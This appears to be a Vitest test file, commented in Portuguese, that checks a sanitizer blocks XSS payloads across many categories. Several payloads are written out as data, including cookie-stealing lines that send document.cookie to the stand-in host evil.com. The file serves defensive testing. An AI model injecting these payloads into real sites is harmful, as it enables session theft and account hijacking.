/**
 * Testes de Proteção contra XSS
 * Verifica que scripts maliciosos são bloqueados em todas as entradas
 */

import { describe, it, expect } from 'vitest';
import { sanitizeString, hasXssPattern, securityCheck } from '@/lib/sanitizer';

describe('Proteção XSS - Tags Script', () => {
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<script src="evil.js"></script>',
    '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
    '<script>new Image().src="http://evil.com/log?c="+document.cookie;</script>',
    '<script type="text/javascript">alert(1)</script>',
    '<script language="javascript">alert(1)</script>',
  ];

  xssPayloads.forEach((payload, index) => {
    it(`deve bloquear payload script #${index + 1}`, () => {
      expect(hasXssPattern(payload)).toBe(true);
      expect(sanitizeString(payload)).not.toContain('<script');
      expect(sanitizeString(payload)).not.toContain('alert');
    });
  });
});

describe('Proteção XSS - Event Handlers', () => {
  const eventPayloads = [
    '<img src="x" onerror="alert(1)">',
    '<body onload="alert(1)">',
    '<div onmouseover="alert(1)">hover</div>',
    '<input onfocus="alert(1)" autofocus>',
    '<a onclick="alert(1)">click</a>',
    '<svg onload="alert(1)">',
    '<iframe onload="alert(1)">',
  ];

  eventPayloads.forEach((payload, index) => {
    it(`deve bloquear event handler #${index + 1}`, () => {
      expect(hasXssPattern(payload)).toBe(true);
      const sanitized = sanitizeString(payload);
      expect(sanitized).not.toMatch(/on\w+=/i);
    });
  });
});

describe('Proteção XSS - JavaScript Protocol', () => {
  const protocolPayloads = [
    '<a href="javascript:alert(1)">click</a>',
    '<iframe src="javascript:alert(1)">',
    '<form action="javascript:alert(1)">',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    'javascript:void(document.cookie)',
  ];

  protocolPayloads.forEach((payload, index) => {
    it(`deve bloquear javascript protocol #${index + 1}`, () => {
      expect(hasXssPattern(payload)).toBe(true);
      expect(sanitizeString(payload)).not.toContain('javascript:');
    });
  });
});

describe('Proteção XSS - Encoded Attacks', () => {
  const encodedPayloads = [
    '&#60;script&#62;alert(1)&#60;/script&#62;', // HTML entities
    '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e', // Unicode
    '%3Cscript%3Ealert(1)%3C/script%3E', // URL encoded
  ];

  encodedPayloads.forEach((payload, index) => {
    it(`deve detectar payload encoded #${index + 1}`, () => {
      // Alguns payloads encoded podem não ser detectados pelo regex
      // mas serão sanitizados pelo DOMPurify
      const sanitized = sanitizeString(payload);
      expect(sanitized).not.toContain('<script');
    });
  });
});

describe('Proteção XSS - Data Protocol', () => {
  const dataPayloads = [
    '<a href="data:text/html,<script>alert(1)</script>">',
    '<iframe src="data:text/html,<script>alert(1)</script>">',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
  ];

  dataPayloads.forEach((payload, index) => {
    it(`deve bloquear data protocol #${index + 1}`, () => {
      expect(hasXssPattern(payload)).toBe(true);
    });
  });
});

describe('Proteção XSS - CSS Injection', () => {
  const cssPayloads = [
    '<style>body { background: url("javascript:alert(1)"); }</style>',
    '<div style="background:expression(alert(1))">',
    '<div style="behavior: url(xss.htc)">',
  ];

  cssPayloads.forEach((payload, index) => {
    it(`deve detectar CSS injection #${index + 1}`, () => {
      const sanitized = sanitizeString(payload);
      expect(sanitized).not.toContain('expression');
      expect(sanitized).not.toContain('javascript:');
    });
  });
});

describe('Proteção XSS - Elementos Perigosos', () => {
  const dangerousElements = [
    '<iframe src="http://evil.com">',
    '<object data="http://evil.com">',
    '<embed src="http://evil.com">',
    '<link rel="import" href="http://evil.com">',
    '<meta http-equiv="refresh" content="0;url=http://evil.com">',
  ];

  dangerousElements.forEach((payload, index) => {
    it(`deve bloquear elemento perigoso #${index + 1}`, () => {
      expect(hasXssPattern(payload)).toBe(true);
      const sanitized = sanitizeString(payload);
      expect(sanitized).not.toMatch(/<(iframe|object|embed|link|meta)/i);
    });
  });
});

describe('Proteção XSS - SVG Vectors', () => {
  const svgPayloads = [
    '<svg><script>alert(1)</script></svg>',
    '<svg onload="alert(1)">',
    '<svg><animate onend="alert(1)">',
    '<svg><set onend="alert(1)">',
  ];

  svgPayloads.forEach((payload, index) => {
    it(`deve bloquear SVG vector #${index + 1}`, () => {
      const sanitized = sanitizeString(payload);
      expect(sanitized).not.toContain('alert');
      expect(sanitized).not.toMatch(/on\w+=/i);
    });
  });
});

describe('Proteção XSS - Security Check Report', () => {
  it('deve reportar ameaças detectadas', () => {
    const result = securityCheck('<script>document.cookie</script>');
    expect(result.safe).toBe(false);
    expect(result.threats).toContain('XSS');
  });

  it('deve retornar valor sanitizado', () => {
    const result = securityCheck('<img src=x onerror=alert(1)>');
    expect(result.sanitizedValue).toBe('');
  });

  it('deve aceitar texto seguro', () => {
    const result = securityCheck('Texto normal sem ameaças');
    expect(result.safe).toBe(true);
    expect(result.threats).toHaveLength(0);
  });
});

describe('Proteção XSS - Polyglot Payloads', () => {
  const polyglotPayloads = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
    '"><img src=x onerror=alert(1)//>',
    "'-alert(1)-'",
    '`-alert(1)-`',
  ];

  polyglotPayloads.forEach((payload, index) => {
    it(`deve bloquear polyglot #${index + 1}`, () => {
      const sanitized = sanitizeString(payload);
      expect(sanitized).not.toContain('alert');
    });
  });
});

describe('Não deve bloquear texto legítimo', () => {
  const legitimateTexts = [
    'Script de teste para documentação',
    'O link para download está disponível',
    'A imagem foi carregada com sucesso',
    'Use a tag HTML para formatar',
    'Selecione a opção desejada',
    'União de tabelas no relatório',
    'Deletar item do carrinho',
  ];

  legitimateTexts.forEach((text, index) => {
    it(`deve permitir texto legítimo #${index + 1}`, () => {
      const sanitized = sanitizeString(text);
      // O texto pode ser levemente modificado mas deve manter o conteúdo
      expect(sanitized.length).toBeGreaterThan(0);
    });
  });
});
